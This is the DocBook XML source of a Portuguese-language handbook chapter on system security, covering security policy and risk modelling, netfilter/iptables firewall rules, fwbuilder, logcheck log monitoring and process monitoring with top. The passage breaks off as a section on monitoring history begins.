<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>Firewall</keyword>
      <keyword>Netfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>Segurança</title>
  <highlights>
    <para>Um sistema de informação pode ter variados níveis de importância, dependendo do ambiente. Em alguns casos, é vital para a sobrevivência de uma empresa. Deve, portanto, ser protegido de vários tipos de riscos. O processo de avaliação desses riscos, definição e execução da proteção é coletivamente conhecido como o "processo de segurança".</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>Definindo uma Política de Segurança</title>

    <sidebar>
      <title><emphasis>ATENÇÃO</emphasis> Escopo deste capítulo</title>

      <para>Segurança é um assunto vasto e muito delicado, por isso não podemos afirmar que vamos descrevê-lo de forma abrangente no curso de um único capítulo. Nós apenas delimitaremos alguns pontos importantes e descreveremos algumas das ferramentas e métodos que podem ser úteis no domínio da segurança. Para ler mais, a literatura é abundante, e livros inteiros foram dedicados ao assunto. Um excelente ponto de partida seria <citetitle>Linux Server Security</citetitle> por Michael D. Bauer (publicado pela O'Reilly).</para>
    </sidebar>

    <para>A palavra "segurança" em si abrange uma vasta gama de conceitos, ferramentas e procedimentos, nenhum dos quais se aplicam universalmente. Escolher entre eles requer uma idéia precisa de quais são seus objetivos. Cuidar da segurança de um sistema começa responder a algumas perguntas. Ao se focar afobadamente na implementação de um conjunto arbitrário de ferramentas corre-se o risco de se concentrar nos aspectos errados da segurança.</para>

    <para>A primeira coisa a determinar é, portanto, o objetivo. Uma boa abordagem para ajudar com esta determinação começa com as seguintes perguntas:</para>
    <itemizedlist>
      <listitem>
	<para><emphasis>O que</emphasis> estamos tentando proteger? A política de segurança vai ser diferente, dependendo se queremos proteger os computadores ou dados. Neste último caso, também precisamos saber quais os dados.</para>
      </listitem>
      <listitem>
	<para><emphasis>Contra</emphasis> o que estamos tentando proteger? Vazamento de dados confidenciais? Perda acidental de dados? Perda de receita causada pela interrupção do serviço?</para>
      </listitem>
      <listitem>
	<para>Além disso, de <emphasis>quem</emphasis> estamos tentando proteger? As medidas de segurança vão ser muito diferentes para se proteger contra um erro de digitação por um usuário regular do sistema do que quando a proteção for contra um determinado grupo atacante.</para>
      </listitem>
    </itemizedlist>

    <para>O termo "risco" é normalmente usado para se referir coletivamente a esses três fatores: o que proteger, o que precisa ser impedido de acontecer, e que vai tentar fazer isso acontecer. Modelagem do risco requer respostas a estas três perguntas. A partir deste modelo de risco, uma política de segurança pode ser construída, e a política pode ser implementada com ações concretas.</para>

    <sidebar>
      <title><emphasis>NOTA</emphasis> Questionamento permanente</title>

      <para>Bruce Schneier, um especialista mundial em matéria de segurança (e não apenas a segurança do computador) tenta combater um dos mitos mais importantes de segurança com um lema: "Segurança é um processo, não um produto". Ativos a serem protegidos mudam no tempo, assim como ameaças e os meios disponíveis para potenciais agressores. Mesmo se uma política de segurança foi inicialmente perfeitamente desenhada e implementada, nunca se deve descansar sobre seus louros. Os componentes de risco evoluem, e a resposta a esse risco deve evoluir nesse sentido.</para>
    </sidebar>

    <para>Restrições adicionais também devem ser levadas em conta, uma vez que podem restringir o leque de políticas disponíveis. Até onde estamos dispostos a ir para proteger um sistema? Esta questão tem um grande impacto sobre a política a implementar. A resposta é muitas vezes definida apenas em termos de custos monetários, mas os outros elementos devem também ser considerados, tais como a quantidade de inconveniência imposta aos usuários do sistema ou degradação do desempenho.</para>

    <para>Uma vez que o risco foi modelado, pode-se começar a pensar sobre a criação de uma política de segurança real.</para>

    <sidebar>
      <title><emphasis>NOTA</emphasis> Políticas extremas</title>

      <para>Há casos em que a escolha das ações necessárias para proteger um sistema é extremamente simples.</para>

      <para>Por exemplo, se o sistema a ser protegido é apenas um computador de segunda mão, cuja única utilização consiste em adicionar alguns números no final do dia, decidir não fazer nada especial para protegê-lo seria bastante razoável. O valor intrínseco do sistema é baixo. O valor dos dados é igual a zero, uma vez que não são armazenados no computador. Um atacante potencial infiltrando este "sistema" só ganharia uma calculadora pesada. O custo de proteger tal sistema seria provavelmente maior do que o custo de uma violação.</para>

      <para>No outro extremo do espectro, podemos querer proteger a confidencialidade de dados secretos da forma mais abrangente possível, superando qualquer outra consideração. Neste caso, uma resposta apropriada seria a destruição total destes dados (apagando de forma segura os arquivos, triturando os discos rígidos em pedaços, em seguida, dissolvendo estes bits em ácido, e assim por diante). Se houver um requisito adicional de que os dados devem ser mantidos guardados para uso futuro (embora não necessariamente prontamente disponível), e se o custo ainda não é um fator, então, um ponto de partida seria armazenar os dados em placas de liga leve de irídio-platina armazenados em depósitos à prova de bomba sob várias montanhas no mundo, cada uma das quais, é claro, completamente secreta e guardada por exércitos inteiros…</para>

      <para>Esses exemplos podem parecer extremos, eles, no entanto, são uma resposta adequada aos riscos definidos, na medida em que eles são o resultado de um processo de pensamento que leva em conta os objetivos a atingir e as limitações a cumprir. Ao vir de uma decisão fundamentada, nenhuma política de segurança é menos respeitável do que qualquer outra.</para>
    </sidebar>

    <para>Na maioria dos casos, o sistema de informação pode ser segmentado em subconjuntos consistentes e na maior parte independentes. Cada subsistema terá suas próprias exigências e restrições, e assim a avaliação do risco e do projeto da política de segurança deve ser realizado separadamente para cada um. Um bom princípio para se manter em mente é que um perímetro pequeno e bem definido é mais fácil de defender do que uma fronteira longa e sinuosa. A organização da rede também deve ser concebida de acordo: os serviços sensíveis devem ser concentrados em um pequeno número de máquinas, e estas máquinas só devem ser acessíveis através de um número mínimo de pontos de verificação; proteger estes pontos de verificação será mais fácil do que proteger todos as máquinas sensíveis contra a totalidade do mundo exterior. É neste ponto que a utilidade de filtragem de rede (incluindo por firewalls) se torna aparente. Esta filtragem pode ser implementada com hardware dedicado, mas uma solução possivelmente mais simples e mais flexível é usar um firewall em software, como por exemplo o integrado no núcleo do Linux.</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>Firewall ou Filtragem de pacotes</title>
    <indexterm><primary>firewall</primary></indexterm>
    <indexterm><primary>Filtragem de pacotes</primary></indexterm>

    <sidebar>
      <title><emphasis>DE VOLTA AO BÁSICO</emphasis> Firewall</title>
      <indexterm><primary>pacote</primary><secondary>IP</secondary></indexterm>

      <para>Um <emphasis>firewall</emphasis> é uma peça de equipamento de informática com hardware e/ou software que classifica os pacotes de entrada ou saída de rede (chegando de ou indo para uma rede local) e só deixa passar aqueles satisfazendo certas condições pré-definidas.</para>
    </sidebar>

    <para>Um firewall é um portal de filtragem da saída de rede e é efetivo apenas em pacotes que devem passar por ele. Portanto, o firewall só será eficaz quando a única rota para estes pacotes for através dele.</para>

    <para>A falta de uma configuração padrão (e do lema "processo, e não produto") explica a falta de uma solução chave. Existem, no entanto, ferramentas que simplificam a configuração do firewall <emphasis>netfilter</emphasis>, com uma representação gráfica das regras de filtragem. <command>fwbuilder</command> está, sem dúvida, entre os melhores.</para>
    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>CASO ESPECÍFICO</emphasis> Firewall Local</title>

      <para>Um firewall pode ser restrito a uma determinada máquina (em oposição a uma rede completa), caso em que seu papel é o de filtrar ou restringir o acesso a alguns serviços, ou possivelmente para evitar que as conexões de saída por softwares maliciosos que um usuário poderia, por vontade própria ou não, ter instalado.</para>
    </sidebar>

    <para>O kernel do Linux incorpora o firewall <emphasis>netfilter</emphasis>. Ele pode ser controlado a partir do espaço do usuário com os comandos <command>iptables</command> e <command>ip6tables</command>. A diferença entre estes dois comandos é que o primeiro atua sobre rede IPv4, enquanto que o último sobre o IPv6. Uma vez que ambas pilhas de protocolo de rede provavelmente estarão circulando por muitos anos, ambas as ferramentas serão utilizadas em paralelo.</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>Funcionamento do Netfilter</title>

      <para><emphasis>netfilter</emphasis> utiliza quatro tabelas distintas que armazenam regras que regulam três tipos de operações sobre pacotes:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>filtro</literal> se ocupa das regras de filtragem (aceitando, recusando ou ignorando um pacote);</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal> diz respeito a tradução de endereços e portas de origem ou destino de pacotes;</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal> diz respeito a outras alterações nos pacotes IP (incluindo campos e opções de ToS - <emphasis>Tipo de Serviço</emphasis>);</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal> permite outras modificações manuais em pacotes antes deles chegarem ao sistema de rastreamento de conexões.</para>
        </listitem>
      </itemizedlist>

      <para>Cada tabela contém listas de regras chamadas <emphasis>cadeias</emphasis>. O firewall usa cadeias padrão para lidar com pacotes com base em circunstâncias pré-definidas. O administrador pode criar outras cadeias, que só serão usadas quando referenciadas por uma das cadeias padrão (tanto direta quanto indiretamente).</para>
      <indexterm><primary>cadeia</primary></indexterm>
      <indexterm><primary>regra de filtragem</primary></indexterm>

      <para>A tabela <literal>filter (filtro)</literal> possui três cadeias padrão:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT (ENTRADA)</literal>: lida com os pacotes cujo destino é o próprio firewall;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT (SAÍDA)</literal>: lida com os pacotes emitidos pelo firewall;</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD (REPASSAR)</literal>: lida com os pacotes em trânsito através do firewall (que não é nem a sua origem nem o seu destino).</para>
        </listitem>
      </itemizedlist>

      <para>A tabela <literal>nat</literal> também tem três cadeias de padrão:</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING (PRÉ ROTEAMENTO)</literal>: altera pacotes assim que eles chegam;</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING (PÓS ROTEAMENTO)</literal>: altera pacotes quando eles estão prontos para seguir seu caminho;</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT (SAÍDA)</literal>: altera pacotes gerados pelo próprio firewall.</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title>Como cadeias <emphasis>netfilter</emphasis> são chamadas</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Cada cadeia é uma lista de regras, cada regra é um conjunto de condições e uma ação a ser executada quando as condições forem satisfeitas. Ao processar um pacote, o firewall examina a correspondente, uma regra após a outra; quando as condições para uma regra são satisfeitas, "pula" (daí a opção <literal>-j </literal>, de jump, nos comandos) para a especificada ação para continuar o processamento. Os comportamentos mais comuns são padronizados, e existem ações específicas para eles. fazer uma destas ações padrão interrompe o processamento da cadeia, já que o destino do pacote já está selado (salvo uma exceção mencionada a seguir):</para>

      <sidebar>
        <title><emphasis>DE VOLTA AO BÁSICO</emphasis> ICMP</title>

	<para>ICMP (<emphasis>Internet Control Message</emphasis> Protocol) é o protocolo usado para transmitir informações complementares sobre as comunicações. Permite testar a conectividade de rede com o comando <command>ping</command> (que envia uma mensagem ICMP <emphasis>echo request</emphasis> (solicitação de eco), que o destinatário deve responder com uma mensagem ICMP <emphasis>echo reply</emphasis>) (resposta echo). Ele sinaliza quando um firewall está rejeitando um pacote, indica um estouro de memoria no buffer de recebimento, propõe uma melhor rota para os pacotes seguintes na conexão, e assim por diante. Este protocolo é definido por vários documentos RFC, o inicial RFC777 e RFC792 logo foram concluídos e ampliados. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>Para referência, um buffer de recepção é uma pequena região de memória para armazenamento de dados entre o tempo que chega na rede e o tempo que o kernel o manipula. Se esta região está cheia, os novos dados não podem ser recebidos, e o ICMP sinaliza o problema, de modo que o emissor possa diminuir a sua taxa de transferência (que deve, idealmente, chegar a um equilíbrio após algum tempo).</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
        <indexterm><primary>buffer de recepção</primary></indexterm>
        <indexterm><primary>buffer</primary><secondary>buffer de recepção</secondary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>Observe que, embora uma rede IPv4 possa funcionar sem ICMP, ICMPv6 é estritamente necessário para uma rede IPv6, uma vez que combina várias funções que eram, no mundo IPv4, espalhados por ICMPv4, IGMP (<emphasis>Internet Group Membership Protocol</emphasis>) e ARP (<emphasis>Address Resolution Protocol</emphasis>). ICMPv6 é definido na RFC4443. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal>: permite que o pacote siga seu caminho;</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal>:  rejeita o pacote com um erro ICMP (a opção <literal>--reject-with<replaceable>tipo</replaceable></literal> para <command>iptables</command> permite seleccionar o tipo de erro);</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal>: apaga (ignora) o pacote;</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal>: loga (via <command>syslogd</command>) uma mensagem com uma descrição do pacote; observe que esta ação não interrompe o processamento, e a execução da cadeia continua na próxima regra, razão pela qual logar pacotes recusados exige tanto uma regra LOG quando uma regra REJECT/DROP;</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal>: loga uma mensagem via <command>ulogd</command>, que pode ser melhor adaptado e mais eficiente que o <command>syslogd</command> para lidar com um grande número de mensagens; observe que esta ação, como LOG, também retorna o processamento para a próxima regra na cadeia chamada;</para>
        </listitem>
        <listitem>
	  <para><replaceable>chain_name</replaceable>: Vai para a cadeia dada e processa as suas regras;</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal>: interrompe o processamento da cadeia atual, e volta para a cadeia chamada; no caso da cadeia atual ser uma das padrão, não há nenhuma cadeia de chamada, de modo que a ação padrão (definida com a opção <literal>-P</literal> para o <command>iptables</command>) é executada em vez disto;</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (apenas na tabela <literal>nat</literal>): aplica <emphasis>Source NAT</emphasis> (opções extras descrevem as alterações exatas para aplicar);</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (apenas na tabela <literal>nat</literal>): aplica <emphasis>Destination NAT</emphasis> (opções extras descrevem as alterações exatas para aplicar);</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (apenas na tabela <literal>nat</literal>): aplica <emphasis>masquerading</emphasis> (um caso especial de <emphasis>Source NAT</emphasis>);</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (apenas na  tabela <literal>nat</literal>): redireciona um pacote para uma determinada porta do próprio firewall; isto pode ser usado para configurar um proxy web transparente que funciona sem nenhuma configuração no lado do cliente, uma vez que o cliente pensa que ele se conecta ao destinatário mas na verdade as comunicações passam pelo proxy.</para>
        </listitem>
      </itemizedlist>

      <para>Outras ações, particularmente as relativas à tabela <literal>mangle</literal>, estão fora do escopo deste texto. O <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> e <citerefentry> <refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> tem um lista completa.</para>
    </section>
    <section id="sect.iptables">
      <title>Sintaxe do <command>iptables</command> e do <command>ip6tables</command></title>

      <para>Os comandos <command>iptables</command> e <command>ip6tables</command> permitem manipulação de tabelas, cadeias e regras. Sua opção <literal>-t <replaceable>tabela</replaceable></literal> indica em qual tabela operar (por padrão, na <literal>filter</literal>).</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>Comandos</title>

	<para>A opção <literal>-N <replaceable>cadeia</replaceable></literal> cria uma nova cadeia. A <literal>-X <replaceable>cadeia</replaceable></literal> exclui uma cadeia vazia e sem uso. A <literal>-A <replaceable>cadeia</replaceable> <replaceable>regra</replaceable></literal> adiciona uma regra no final da cadeia dada. A opção <literal>-I <replaceable>cadeia</replaceable> <replaceable>número_regra</replaceable> <replaceable>regra</replaceable></literal> insere uma regra antes da regra número <replaceable>número_regra</replaceable>. A opção <literal>-D <replaceable>cadeia</replaceable> <replaceable>número_regra</replaceable></literal> (ou <literal>-D <replaceable>cadeia</replaceable> <replaceable>regra</replaceable></literal>) remove uma regra na cadeia; a primeira sintaxe identifica a regra a ser removida pelo seu número, enquanto a segunda a identifica pelo seu conteúdo. A opção <literal>-F <replaceable>cadeia</replaceable></literal> esvazia uma cadeia (remove todas suas regras); se nenhuma cadeia é mencionada, todas as regras da tabela são removidas. A opção <literal>-L <replaceable>cadeia</replaceable></literal> lista as regras na cadeia. Finalmente, a opção <literal>-P <replaceable>cadeia</replaceable> <replaceable>ação</replaceable></literal> define a ação padrão, ou "política", para uma dada cadeia; observe que apenas as cadeias padrão podem ter essa política.</para>
      </section>
      <section id="sect.iptables-rules">
        <title>Regras</title>
        <indexterm><primary>regra de filtragem</primary></indexterm>

	<para>Cada regra é expressa como <literal><replaceable>condições</replaceable> -j <replaceable>ação</replaceable> <replaceable>opções_ações</replaceable></literal>. Se várias condições são descritas na mesma regra, então o critério é a conjunção (<emphasis>e</emphasis> lógico) das condições, que é pelo menos tão restritiva quanto cada condição individual.</para>

	<para>A condição <literal>-p <replaceable>protocolo</replaceable></literal> corresponde ao campo protocolo do pacote IP. Os valores mais comuns são <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal>, e <literal>icmpv6</literal>. Prefixar a condição com um ponto de exclamação nega a condição, que se transforma numa correspondência para "todos os pacotes com um protocolo diferente do especificado". Este mecanismo de negação não é específico para a opção <literal>-p</literal> e também pode ser aplicada a todas outras condições.</para>

	<para>A condição <literal>-s <replaceable>endereço</replaceable></literal> ou <literal>-s <replaceable>rede/máscara</replaceable></literal> corresponde ao endereço de origem do pacote. Do mesmo modo, <literal>-d <replaceable>endereço</replaceable></literal> ou <literal>-d <replaceable>rede/máscara</replaceable></literal> corresponde ao endereço de destino.</para>

	<para>A condição <literal>-i <replaceable>interface</replaceable></literal> seleciona os pacotes entrando pela dada interface. <literal>-o <replaceable>interface</replaceable></literal> seleciona pacotes saindo de uma interface específica.</para>

	<para>Existem condições mais específicas, dependendo das condições genéricas acima descritas. Por exemplo, a condição <literal>-p TCP</literal> pode ser complementada com condições sobre as portas TCP, com cláusulas como <literal>--source-port <replaceable>porta</replaceable></literal> (porta de origem) e <literal>--destination-port <replaceable>porta</replaceable></literal> (porta de destino).</para>

	<para>A condição <literal>--state <replaceable>estado</replaceable></literal> corresponde ao estado de um pacote em uma conexão (isto requer o módulo <command>ipt_conntrack</command> do kernel, para rastreamento de conexões). O estado  <literal>NEW</literal> descreve um pacote iniciando uma nova conexão; O estado <literal>ESTABLISHED</literal> corresponde aos pacotes pertencentes a uma conexão já existente, e <literal>RELATED</literal> correspondem aos pacotes iniciando uma nova conexão relacionada a uma já existente (o que é útil para as conexões <literal>ftp-data</literal> no modo ativo do protocolo FTP).</para>

	<para>A seção anterior lista as ações disponíveis, mas não suas respectivas opções. A ação <literal>LOG</literal>, por exemplo, tem as seguintes opções:</para>
        <itemizedlist>
          <listitem>
	    <para><literal>--log-level</literal>, com valor padrão <literal>warning</literal> (aviso), indica o nível de severidade no <command>syslog</command>;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-prefix</literal> permite especificar um prefixo de texto para diferenciar mensagens registradas;</para>
          </listitem>
          <listitem>
	    <para><literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> e <literal>--log-ip-options</literal> indicam dados extras a serem integrados na mensagem: respectivamente, o número de seqüência TCP, opções TCP, e as opções IP.</para>
          </listitem>
        </itemizedlist>

	<para>A ação <literal>DNAT</literal> fornece a opção <literal>--to-destination <replaceable>endereço</replaceable>:<replaceable>porta</replaceable></literal> para indicar o novo endereço IP de destino e/ou porta. Da mesma forma, <literal>SNAT</literal> fornece <literal>--to-source <replaceable>endereço</replaceable>:<replaceable>porta</replaceable></literal> para indicar o novo endereço e/ou porta IP de origem.</para>

	<para>A ação <literal>REDIRECT</literal> (disponível apenas se o NAT está disponível) fornece a opção <literal>--to-ports <replaceable>porta(s)</replaceable></literal> para indicar a porta, ou intervalo de portas, para onde os pacotes devem ser redirecionados.</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>Criando Regras</title>

      <para>Cada criação de regra exige uma invocação de <command>iptables</command>/<command>ip6tables</command>. Digitar estes comandos manualmente pode ser tedioso, por isso as chamadas são normalmente armazenados em um script para que a mesma configuração seja criada automaticamente a cada vez que a máquina inicia. Este script pode ser escrito à mão, mas também pode ser interessante prepará-lo com uma ferramenta de alto nível, como <command>fwbuilder</command>.</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para>O princípio é simples. Na primeira etapa, é preciso descrever todos os elementos que estarão envolvidos nas regras reais:</para>
      <itemizedlist>
        <listitem>
	  <para>o próprio firewall, com suas interfaces de rede;</para>
        </listitem>
        <listitem>
	  <para>as redes, com suas faixas de IP correspondentes;</para>
        </listitem>
        <listitem>
	  <para>os servidores;</para>
        </listitem>
        <listitem>
	  <para>as portas que pertencem aos serviços hospedados nos servidores.</para>
        </listitem>
      </itemizedlist>

      <para>As regras são então criadas com simples ações de arrastar-e-soltar nos objetos. Alguns menus contextuais podem alterar a condição (negando-a, por exemplo). Em seguida, a ação deve ser escolhida e configurada.</para>

      <para>Quando IPv6 está ativo, pode se criar dois conjuntos de regras distintas para IPv4 e IPv6, ou criar uma só e deixar o <command>fwbuilder</command> traduzir as regras de acordo com os endereços atribuídos aos objetos.</para>

      <figure id="figure.fwbuilder">
        <title>janela principal do Fwbuilder</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para><command>fwbuilder</command> pode gerar um script de configuração do firewall de acordo com as regras que foram definidas. Sua arquitetura modular lhe confere a capacidade de gerar scripts que visam diferentes sistemas (<command>iptables</command> para Linux, <command>ipf</command> para o FreeBSD e <command>pf</command> para OpenBSD).</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>Instalando as Regras em Cada Inicialização</title>

      <para>Em outros casos, a maneira recomendada é registrar o script de configuração em uma directiva <literal>up</literal> do <filename>/etc/network/interfaces</filename>. No exemplo a seguir, o script é armazenado em <filename>/usr/local/etc/arrakis.fw</filename>.</para>

      <example id="example.network-interfaces-firewall">
        <title>arquivo <filename>interfaces</filename> chamando script firewall</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>
      </example>
      <para>Isso obviamente assume que você está usando o <emphasis role="pkg">ifupdown</emphasis> para configurar as interfaces de rede. Se você está usando algo diferente (como o <emphasis>NetworkManager</emphasis> ou <emphasis>systemd-networkd</emphasis>), então consulte suas respectivas documentações para encontrar maneiras de executar um script após a interface ter sido levantada.</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>Supervisão: Prevenção, Detecção, Desencorajamento</title>
    <indexterm><primary>Monitoramento</primary></indexterm>

    <para>O monitoramento é uma parte integrante de qualquer política de segurança por várias razões. Entre elas, que o objetivo da segurança não é normalmente restrito a garantir a confidencialidade dos dados, mas também inclui a disponibilidade assegurada dos serviços. Portanto, é imperativo verificar se tudo funciona como esperado, e para detectar em tempo hábil qualquer desvio no comportamento ou mudança na qualidade do(s) serviço(s) entregue(s). A atividade de monitoramento pode ajudar a detectar tentativas de invasão e permitir uma reação rápida antes que elas causem consequências graves. Esta seção analisa algumas ferramentas que podem ser usadas para monitorar vários aspectos de um sistema Debian. Como tal, completa <xref linkend="sect.monitoring" />.</para>
    <section id="sect.logcheck">
      <title>Monitoramento de Logs com <command>logcheck</command></title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>logs</primary><secondary>monitorando</secondary></indexterm>
      <indexterm><primary>monitorando</primary><secondary>arquivos de log</secondary></indexterm>

      <para>O programa <command>logcheck</command> monitora arquivos de log a cada hora por padrão. Ele envia mensagens de log incomuns em e-mails para o administrador, para posterior análise.</para>

      <para>A lista de arquivos monitorados é armazenada em <filename>/etc/logcheck/logcheck.logfiles</filename>, os valores padrão funcionam bem se o arquivo <filename>/etc/rsyslog.conf</filename> não foi completamente refeito.</para>

      <para><command>logcheck</command> pode trabalhar em um dos três modos mais ou menos detalhados: <emphasis>paranoid</emphasis>, <emphasis>server</emphasis> e <emphasis>workstation</emphasis>. O primeiro é <emphasis>muito</emphasis> verboso, e provavelmente deve ser restrito a servidores específicos, tais como firewalls. O segundo modo (e padrão) é recomendado para a maioria dos servidores. O último é projetado para estações de trabalho, e é ainda mais suscinto (filtra ainda mais mensagens).</para>

      <para>Nos três casos, o <command>logcheck</command> provavelmente deve ser personalizado para excluir algumas mensagens extras (dependendo dos serviços instalados), a menos que o administrador realmente deseje receber lotes por hora de longos e-mails desinteressantes. Uma vez que o mecanismo de seleção de mensagem é bastante complexo, <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> é uma leitura necessária - quiçá desafiadora.</para>

      <para>As regras aplicadas podem ser divididas em vários tipos:</para>
      <itemizedlist>
        <listitem>
	  <para>aquelas que qualificam uma mensagem como uma tentativa de invasão (armazenada em um arquivo no diretório <filename>/etc/logcheck/cracking.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>aquelas cancelando essas qualificações (<filename>/etc/logcheck/cracking.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>aquelas classificando uma mensagem como um alerta de segurança (<filename>/etc/logcheck/violations.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>aquelas cancelando esta classificação (<filename>/etc/logcheck/violations.ignore.d/</filename>);</para>
        </listitem>
        <listitem>
	  <para>e finalmente, as que se aplicam às mensagens restantes (consideradas como <emphasis>eventos de sistema</emphasis>).</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>ATENÇÃO</emphasis> Ignorando uma mensagem</title>

	<para>Qualquer mensagem marcada como uma tentativa de invasão ou um alerta de segurança (seguindo uma regra armazenada num arquivo <filename>/etc/logcheck/violations.d/myfile</filename>) só pode ser ignorada por uma regra em arquivos <filename>/etc/logcheck/violations.ignore.d/myfile</filename> ou  <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extensão</replaceable></filename>.</para>
      </sidebar>

      <para>Um evento de sistema é sempre sinalizado a menos que uma regra em um dos diretórios <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> indique que o evento deve ser ignorado. Naturalmente, os únicos diretórios levados em consideração são aqueles que correspondem aos níveis de verbosidade iguais ou maiores que o modo de funcionamento selecionado.</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>Monitorando Atividades</title>
      <indexterm><primary>monitorando</primary><secondary>atividades</secondary></indexterm>
      <indexterm><primary>atividades, monitorando</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>Em Tempo Real</title>

	<para><command>top</command> é uma ferramenta interativa que exibe uma lista de processos em execução. A ordem padrão baseia-se na quantidade atual de utilização do processador e pode ser obtida com a tecla <keycap>P</keycap>. Outras ordenações incluem ordenar por memória ocupada (tecla <keycap>M</keycap>), pelo tempo total do processador (tecla <keycap>T</keycap>) e pelo identificador de processo (tecla <keycap>N</keycap>). A tecla <keycap>k</keycap> permite matar um processo digitando seu identificador de processo. A tecla <keycap>r</keycap> permite fazer <emphasis>renice</emphasis> num processo, ou seja, mudar sua prioridade.</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>Quando o sistema parece estar sobrecarregado, <command>top</command> é uma ótima ferramenta para ver quais processos estão competindo por tempo de processador ou consumindo muita memória. Em particular, muitas vezes é interessante verificar se os processos que consomem recursos coincidem com os serviços reais conhecidos que a máquina hospeda. Um processo desconhecido rodando como o usuário www-data deve realmente se destacar e ser investigado, já que é provavelmente uma instância de software instalado e executado no sistema através de uma vulnerabilidade em uma aplicação web.</para>

	<para><command>top</command> é uma ferramenta muito flexível e sua página de manual dá detalhes sobre como personalizar a sua exibição e adaptá-la às suas necessidades e hábitos pessoais.</para>

        <para>A ferramenta gráfica <command>gnome-system-monitor</command> é semelhante ao <command>top</command> e proporciona mais ou menos os mesmos recursos.</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>História</title>
        <indexterm><primary>atividades, histórico de</primary></indexterm>

	<para>Carga do processador, o tráfego de rede e o espaço livre no disco são informações que variam constantemente. Manter um histórico de sua evolução é muitas vezes útil para determinar exatamente como o computador é usado.</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>

	<para>Existem muitas ferramentas dedicadas a esta tarefa. A maioria pode buscar dados via SNMP (<emphasis>Simple Network Management Protocol</emphasis>, a fim de centralizar esta informação. Um benefício adicional é que este permite buscar dados de elementos de rede que podem não ser de computadores de uso geral, tais como roteadores de rede dedicadas ou switches.</para>

